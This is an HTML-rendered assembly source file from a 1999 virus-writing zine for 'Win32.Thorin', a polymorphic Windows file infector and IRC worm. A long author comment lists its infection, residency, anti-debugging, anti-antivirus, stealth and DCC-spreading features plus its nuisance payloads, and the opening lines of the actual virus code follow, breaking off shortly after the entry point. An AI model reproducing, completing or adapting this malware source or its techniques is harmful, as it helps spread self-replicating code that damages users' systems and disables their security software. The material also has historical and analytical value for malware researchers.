<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>thorin.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 204 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">; [Win32.Thorin] - PE/mIRC/PIRCH/ViRC97/resident/semi-stealth/poly/RDA, etc.</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1999 by Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; €€ª    €€ª €€ª €€€ª   €€ª €€€€€€ª  €€€€€€ª</span><span class="sc0">
</span><span class="sc1">; €€∫    €€∫ €€∫ €€€€ª  €€∫ »ÕÕÕÕ€€ª »ÕÕÕÕ€€ª</span><span class="sc0">
</span><span class="sc1">; €€∫ €ª €€∫ €€∫ €€…€€ª €€∫  €€€€€…º  €€€€€…º</span><span class="sc0">
</span><span class="sc1">; €€∫€€€ª€€∫ €€∫ €€∫»€€ª€€∫  »ÕÕÕ€€ª €€…ÕÕÕº</span><span class="sc0">
</span><span class="sc1">; »€€€…€€€…º €€∫ €€∫ »€€€€∫ €€€€€€…º €€€€€€€ª €€ª</span><span class="sc0">
</span><span class="sc1">;  »ÕÕº»ÕÕº  »Õº »Õº  »ÕÕÕº »ÕÕÕÕÕº  »ÕÕÕÕÕÕº »Õº</span><span class="sc0">
</span><span class="sc1">;                        €€€€€€€€ª €€ª  €€ª  €€€€€€ª  €€€€€€ª  €€ª €€€ª   €€ª</span><span class="sc0">
</span><span class="sc1">;                        »ÕÕ€€…ÕÕº €€∫  €€∫ €€…ÕÕÕ€€ª €€…ÕÕ€€ª €€∫ €€€€ª  €€∫</span><span class="sc0">
</span><span class="sc1">;                           €€∫    €€€€€€€∫ €€∫   €€∫ €€€€€€…º €€∫ €€…€€ª €€∫</span><span class="sc0">
</span><span class="sc1">;                           €€∫    €€…ÕÕ€€∫ €€∫   €€∫ €€…ÕÕ€€ª €€∫ €€∫»€€ª€€∫</span><span class="sc0">
</span><span class="sc1">;                           €€∫    €€∫  €€∫ »€€€€€€…º €€∫  €€∫ €€∫ €€∫ »€€€€∫</span><span class="sc0">
</span><span class="sc1">;                           »Õº    »Õº  »Õº  »ÕÕÕÕÕº  »Õº  »Õº »Õº »Õº  »ÕÕÕº</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : Thorin.11932 [ Bugfix version ]</span><span class="sc0">
</span><span class="sc1">; Virus Author  : Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">; Origin        : Spain</span><span class="sc0">
</span><span class="sc1">; Platform      : Win32</span><span class="sc0">
</span><span class="sc1">; Target        : PE files (EXE/SCR/CPL) &amp; mIRC/PIRCH/ViRC97 spreading</span><span class="sc0">
</span><span class="sc1">; Poly          : THME 1.0 [The Hobbit Mutation Engine]</span><span class="sc0">
</span><span class="sc1">; Unpack        : LSCE 1.0 [Little Shitty Compression Engine]</span><span class="sc0">
</span><span class="sc1">; Compiling     : TASM 5.0 and TLINK 5.0 should be used</span><span class="sc0">
</span><span class="sc1">;                       tasm32 /ml /m3 thorin,,;</span><span class="sc0">
</span><span class="sc1">;                       tlink32 /Tpe /aa /c /v thorin,thorin,,import32.lib,</span><span class="sc0">
</span><span class="sc1">;                       pewrsec thorin.exe</span><span class="sc0">
</span><span class="sc1">; Why 'Thorin'? : Heh,  are  you an incult  guy? Heh, have  you ever read the</span><span class="sc0">
</span><span class="sc1">;                 wonderful book  of the  wonderful author  J. R. R. Tolkien,</span><span class="sc0">
</span><span class="sc1">;                 called "The Hobbit"? Ok, if  you did  it, you  can  realize</span><span class="sc0">
</span><span class="sc1">;                 that the most important  dwarf is called  in this way :) He</span><span class="sc0">
</span><span class="sc1">;                 died with honour, and he  couldn't taste the victory and be</span><span class="sc0">
</span><span class="sc1">;                 the king, anyway thanks to him, the Middle-Earth was a much</span><span class="sc0">
</span><span class="sc1">;                 better world for years. Ain't it charming? ;)</span><span class="sc0">
</span><span class="sc1">; Features      : Ok, here i will list all that this babe is able to do...</span><span class="sc0">
</span><span class="sc1">;                 ˘ Infect PE files in current, Windows, and System dirs.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Runtime module, infects 4 files each time.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Per-Process residency (Import Table &amp; GetProcAddress).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Infects EXE, SCR &amp; CPL files.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Anti-Debugging features (SEH &amp; 'IsDebuggerPresent').</span><span class="sc0">
</span><span class="sc1">;                 ˘ Anti-Emulation features.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Anti-Monitors, kills AVP Monitor and AMON.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Polymorphic layer of decryption.</span><span class="sc0">
</span><span class="sc1">;                 ˘ RDA layer of decryption.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Size Stealth (FindFirstFileA/FindNextFileA).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Fast infection (depending of the host).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Internet aware virus: mIRC, ViRC97 and PIRCH scripts.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Traversal routine for search for the scripts (hi LJ!).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Packed dropper, used LSCE 1.0.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Really tiny unpacker.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Multiple payloads (see below).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Doesn't hardcode KERNEL32 base address.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Doesn't hardcode API addresses (of course).</span><span class="sc0">
</span><span class="sc1">;                 ˘ Gets Image Base at running time.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Removes many AV CRC files.</span><span class="sc0">
</span><span class="sc1">;                 ˘ Avoids infection of certain (dangerous for us) files.</span><span class="sc0">
</span><span class="sc1">; Payloads      : Yes, this virus has multiple payloads (hi DuST!). Let's see</span><span class="sc0">
</span><span class="sc1">;                 a little  overview  of them (executed every 26 of October).</span><span class="sc0">
</span><span class="sc1">;                 1. The biggest one, based  in a  trick  that i  learnt from</span><span class="sc0">
</span><span class="sc1">;                 mandragore's viruses, dropping  a file  as C:\WIN.COM, that</span><span class="sc0">
</span><span class="sc1">;                 gets executed by the system before  of the file that should</span><span class="sc0">
</span><span class="sc1">;                 be, that is C:\WINDOWS\WIN.COM, thus bringing us the possi-</span><span class="sc0">
</span><span class="sc1">;                 bility of own the computer before windows :) Well, it cons-</span><span class="sc0">
</span><span class="sc1">;                 ists in  a very  little, simple and  easy quiz that all ppl</span><span class="sc0">
</span><span class="sc1">;                 who had read "The Hobbit" once in his life would be able to</span><span class="sc0">
</span><span class="sc1">;                 pass without problems, and consists of 3 questions.</span><span class="sc0">
</span><span class="sc1">;                 2. Sets the HD's name as 'THORIN'.</span><span class="sc0">
</span><span class="sc1">;                 3. Due an idea  that my friend  Qozah gave me, it swaps the</span><span class="sc0">
</span><span class="sc1">;                 mouse buttons, thus  making the  user be  stoned... All you</span><span class="sc0">
</span><span class="sc1">;                 clicked with the left button, now you'll have to click with</span><span class="sc0">
</span><span class="sc1">;                 the right one, and vice-versa.</span><span class="sc0">
</span><span class="sc1">;                 4. The typical MessageBox with a silly message.</span><span class="sc0">
</span><span class="sc1">;                 5. Launches user  to Microsoft page, thus annoying  him and</span><span class="sc0">
</span><span class="sc1">;                 make his little and ignorant mind to think that the awaited</span><span class="sc0">
</span><span class="sc1">;                 Micro$oft offensive  over the  earth has began. Well, ain't</span><span class="sc0">
</span><span class="sc1">;                 this one charming? ;)</span><span class="sc0">
</span><span class="sc1">; Internet      : This  virus is  able  to  spread itself using the most used</span><span class="sc0">
</span><span class="sc1">;                 IRC  programs over  the  world: mIRC, PIRCH and ViRC. Every</span><span class="sc0">
</span><span class="sc1">;                 infected  system  will  have  a  little  infected  file  in</span><span class="sc0">
</span><span class="sc1">;                 C:\PR0N.EXE. This  file  is sent to everyone that joins the</span><span class="sc0">
</span><span class="sc1">;                 channel where the  user is chatting by DCC. Very simple and</span><span class="sc0">
</span><span class="sc1">;                 effective.</span><span class="sc0">
</span><span class="sc1">; Greetings     : This virus is dedicated  to many people... Firstly, to  the</span><span class="sc0">
</span><span class="sc1">;                 iKX crew for trust in me, to the DDT past,present and futu-</span><span class="sc0">
</span><span class="sc1">;                 re crew for the friendship during the time, 29A ppl, FS ppl</span><span class="sc0">
</span><span class="sc1">;                 etc. Now, the  personal greetings (w/ no particular order):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 SeptiC - Your 'Internet aware viruses' article rules!!!</span><span class="sc0">
</span><span class="sc1">;                 b0z0 - Hi, my favourite 'little' clown :)</span><span class="sc0">
</span><span class="sc1">;                 StarZer0 - no. no, no. no sex.</span><span class="sc0">
</span><span class="sc1">;                 Int13h - I'd like you come to Spain :)</span><span class="sc0">
</span><span class="sc1">;                 Murkry - I'm glad to be in a group with this genius.</span><span class="sc0">
</span><span class="sc1">;                 n0ph - I still don't have the pleasure of knowin' you...</span><span class="sc0">
</span><span class="sc1">;                 Somniun - Si tienes alguna duda de Win32, pregunta!! ;)</span><span class="sc0">
</span><span class="sc1">;                 Wintermute - RAMMSTEIN rules! You always have reason ;)</span><span class="sc0">
</span><span class="sc1">;                 Owl - You are very isolated from the world, pal :)</span><span class="sc0">
</span><span class="sc1">;                 Vecna - The best coder of everytime.</span><span class="sc0">
</span><span class="sc1">;                 Ypsilon - Nos vemos en septiembre! :)</span><span class="sc0">
</span><span class="sc1">;                 Bumblebee - Pues eso, a ver si tu vienes tambien...</span><span class="sc0">
</span><span class="sc1">;                 TechnoPhunk - Forget catholicism and be nihilist! ;)</span><span class="sc0">
</span><span class="sc1">;                 Qozah - I'd like to do a cooperation project with ya ;)</span><span class="sc0">
</span><span class="sc1">;                 Benny - Same with you :) Yer a reely impressive codah!</span><span class="sc0">
</span><span class="sc1">;                 Super - ®Como te va en Castellon?</span><span class="sc0">
</span><span class="sc1">;                 nIgr0 - Code viruses, not 'legal' thingies!</span><span class="sc0">
</span><span class="sc1">;                 MDriller - best p0lys without any kinda discussion...</span><span class="sc0">
</span><span class="sc1">;                 T-2000 - I share ur ideas 'bout religion: radical but true</span><span class="sc0">
</span><span class="sc1">;                 SlageHammer - I loved yer city! Milano rocks! Padania rocks!</span><span class="sc0">
</span><span class="sc1">;                 VirusBuster - I've seen "Love Struck Baby" video. SRV rlz ;)</span><span class="sc0">
</span><span class="sc1">;                 LordJulus - Keep on coding, but optimize more! ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 Also dedicated to all the Bards around!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thoughts      : This is, nowadays, my  best virus  so far, over Iced Earth,</span><span class="sc0">
</span><span class="sc1">;                 Garaipena, and Nitro, all of  them for Windoze. I needed to</span><span class="sc0">
</span><span class="sc1">;                 do at least  a good  virus, for feed my own ego (why lie?),</span><span class="sc0">
</span><span class="sc1">;                 and i think this is  what really happened. But i won't stop</span><span class="sc0">
</span><span class="sc1">;                 there, there are many  things yet to  explore (and exploit)</span><span class="sc0">
</span><span class="sc1">;                 in 32 bit  enviroments, there are  many problems  unsolved,</span><span class="sc0">
</span><span class="sc1">;                 and i  will try  to contribute  with my humble code for all</span><span class="sc0">
</span><span class="sc1">;                 those purposes. Btw, i used, in my other viruses, to try to</span><span class="sc0">
</span><span class="sc1">;                 optimize , but  in  this virus i didn't. I  mean, you won't</span><span class="sc0">
</span><span class="sc1">;                 see here OBVIOUS lacks of optimization, like CMP reg,-1 but</span><span class="sc0">
</span><span class="sc1">;                 i will use many times the same code in different procedures</span><span class="sc0">
</span><span class="sc1">;                 many  strings, two  droppers (one for IRC distribution, and</span><span class="sc0">
</span><span class="sc1">;                 other for one payload). This virus is big in its size, well</span><span class="sc0">
</span><span class="sc1">;                 not as  Win32.Harrier,  Win32.Libertine, WinNT.Remex, etc.,</span><span class="sc0">
</span><span class="sc1">;                 but it's a 'big' one, and  i hope  this  will mean a 'good'</span><span class="sc0">
</span><span class="sc1">;                 one. Fuck, i've coded also a  lot of payloads, none of them</span><span class="sc0">
</span><span class="sc1">;                 is destructive, but all are VERY annoying... The descripti-</span><span class="sc0">
</span><span class="sc1">;                 on is above, if you don't believe me.</span><span class="sc0">
</span><span class="sc1">;                 Well, now i'm  gonna excuse myself,  because  while  making</span><span class="sc0">
</span><span class="sc1">;                 this virus (based initially  on my Win95.Iced Earth) i have</span><span class="sc0">
</span><span class="sc1">;                 noticed the great quantity of bugs that my Iced Earth virus</span><span class="sc0">
</span><span class="sc1">;                 had (believe me, more  than 10  incredible bugs!),  and i'm</span><span class="sc0">
</span><span class="sc1">;                 still wondering why all those escaped from my beta testing.</span><span class="sc0">
</span><span class="sc1">;                 Moreover, all those bugs only reflect my incompetence. With</span><span class="sc0">
</span><span class="sc1">;                 this virus i  have made  very serious tests, mainly because</span><span class="sc0">
</span><span class="sc1">;                 some delicated parts of the virus needed it to work perfec-</span><span class="sc0">
</span><span class="sc1">;                 ly (i.e. per-process  residence). Maybe there  will be also</span><span class="sc0">
</span><span class="sc1">;                 bugs, but now at least i know there are less :)</span><span class="sc0">
</span><span class="sc1">;                 My next steps  will be  the  research  in the fields of MMX</span><span class="sc0">
</span><span class="sc1">;                 polymorphism, some  metamorphism, and i  hope  that my next</span><span class="sc0">
</span><span class="sc1">;                 virus will use EPO techniques, because i haven't experimen-</span><span class="sc0">
</span><span class="sc1">;                 ted yet with such a kewl thing.</span><span class="sc0">
</span><span class="sc1">; Politics      : Benny doesn't like that i use to talk about politics, but i</span><span class="sc0">
</span><span class="sc1">;                 have put it there  just for explain some  things that could</span><span class="sc0">
</span><span class="sc1">;                 guide you to  misunderstand my  way of act. Everybody knows</span><span class="sc0">
</span><span class="sc1">;                 that i tend to  Marxism, right? Well, but  i'm  not  saying</span><span class="sc0">
</span><span class="sc1">;                 with this that  i support  Fidel Castro, Mao, and such like</span><span class="sc0">
</span><span class="sc1">;                 pseudo-communists (that tend to totalitarism). I think that</span><span class="sc0">
</span><span class="sc1">;                 everybody must have  the same oportunities, and without any</span><span class="sc0">
</span><span class="sc1">;                 kind of discrimination. But as i  am not a guy with an only</span><span class="sc0">
</span><span class="sc1">;                 idea, i  support also (if there isn't any other choice) the</span><span class="sc0">
</span><span class="sc1">;                 democracy, but i prefer it to be  a democracy as participa-</span><span class="sc0">
</span><span class="sc1">;                 tion and not as a procediment. Whom has studied some philo-</span><span class="sc0">
</span><span class="sc1">;                 sophy will know of what  i am  talking about: avoid the fi-</span><span class="sc0">
</span><span class="sc1">;                 erce  and  discriminatory capitalism. As i am tolerant, you</span><span class="sc0">
</span><span class="sc1">;                 can be againist my  ideas, and i  will accept it. So Benny,</span><span class="sc0">
</span><span class="sc1">;                 i'm not a totalitarian asshole, just the opposite, i'm just</span><span class="sc0">
</span><span class="sc1">;                 a young idealist :) Be free, enjoy life...</span><span class="sc0">
</span><span class="sc1">; Final note    : Although it  screwed me  a lot, i  haven't put  data in the</span><span class="sc0">
</span><span class="sc1">;                 heap as i used to  do because this virus is too big and the</span><span class="sc0">
</span><span class="sc1">;                 data used temporally is also too big, and it generated some</span><span class="sc0">
</span><span class="sc1">;                 protection faults... SHIT!!!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                              That is not dead</span><span class="sc0">
</span><span class="sc1">;                           which can eternal lie</span><span class="sc0">
</span><span class="sc1">;                           yet with strange aeons</span><span class="sc0">
</span><span class="sc1">;                             even death may die</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                             -H. P. Lovecraft-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1999 Billy Belcebu/iKX</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">
        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">; 1st gen exported apis</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">; Some useful equates</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">poly_virus_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">thorin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">shit_b4_delta</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">encrypt_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypto</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">non_crypt_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc5">encrypt_size</span><span class="sc4">-</span><span class="sc5">rda_decryptor</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_decryptor</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">crypt_end</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">section_flags</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">directory_attr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">temp_attributes</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">drop_old_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00011000d</span><span class="sc0">
</span><span class="sc5">n_Handles</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc0">
</span><span class="sc5">WFD_HndSize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">n_Handles</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">n_infections</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">bad_number</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">09h</span><span class="sc0">

</span><span class="sc5">orig_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">044h</span><span class="sc0">
</span><span class="sc5">mark</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04Ch</span><span class="sc0">
</span><span class="sc5">ddInfMark</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc3">"NRHT"</span><span class="sc0">

</span><span class="sc5">kernel_</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0BFF70000h</span><span class="sc0">              </span><span class="sc1">; Only used if the K32 search</span><span class="sc0">
</span><span class="sc5">kernel_wNT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">077F00000h</span><span class="sc0">              </span><span class="sc1">; fails...</span><span class="sc0">

</span><span class="sc5">imagebase_</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000400000h</span><span class="sc0">              </span><span class="sc1">; y0h0h0</span><span class="sc0">

</span><span class="sc1">; Interesting macros for my code</span><span class="sc0">

</span><span class="sc5">cmp_</span><span class="sc0">            </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">joff1</span><span class="sc0">               </span><span class="sc1">; Optimized version of</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">reg</span><span class="sc0">                     </span><span class="sc1">; CMP reg,0FFFFFFFFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">joff1</span><span class="sc0">                   </span><span class="sc1">; JZ  joff1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">reg</span><span class="sc0">                     </span><span class="sc1">; The code is reduced in 3</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">                            </span><span class="sc1">; bytes (7-4)</span><span class="sc0">

</span><span class="sc5">cmpz</span><span class="sc0">            </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">joff2</span><span class="sc0">               </span><span class="sc1">; Optimized version of</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; CMP reg,00h</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">joff2</span><span class="sc0">                   </span><span class="sc1">; JZ  joff2</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">                            </span><span class="sc1">; Code reduced in 2 bytes</span><span class="sc0">

</span><span class="sc5">cmpz_</span><span class="sc0">           </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">joff3</span><span class="sc0">               </span><span class="sc1">; Blah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">reg</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">joff3</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">apicall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">apioff</span><span class="sc0">                  </span><span class="sc1">; Optimize muthafucka!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apioff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">rva2va</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">base</span><span class="sc0">                </span><span class="sc1">; Only for make preetiest the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">reg</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; code ;)</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">virussize</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">10000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">01000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; Some shitty thingies in data section... 1st gen host messages</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szTitle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Win32.Thorin]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMessage</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"First Generation Sample"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Virus Size : "</span><span class="sc0">
        </span><span class="sc5">virussize</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" bytes"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Copyright (c) 1999 by Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; El ke mucho llora es porke no mama!</span><span class="sc0">

     </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Virus code</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; DU HAST MICH!!!</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">poly_layer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">LIMIT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Space for poly-decryptor</span><span class="sc0">

</span><span class="sc5">thorin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Push all da shit</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">

    </span><span class="sc7">fwait</span><span class="sc0">                                   </span><span class="sc1">; Reset coprocessor</span><span class="sc0">
    </span><span class="sc7">fninit</span><span class="sc0">                                  

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_av</span><span class="sc0">                         </span><span class="sc1">; Anti-emulation trick</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
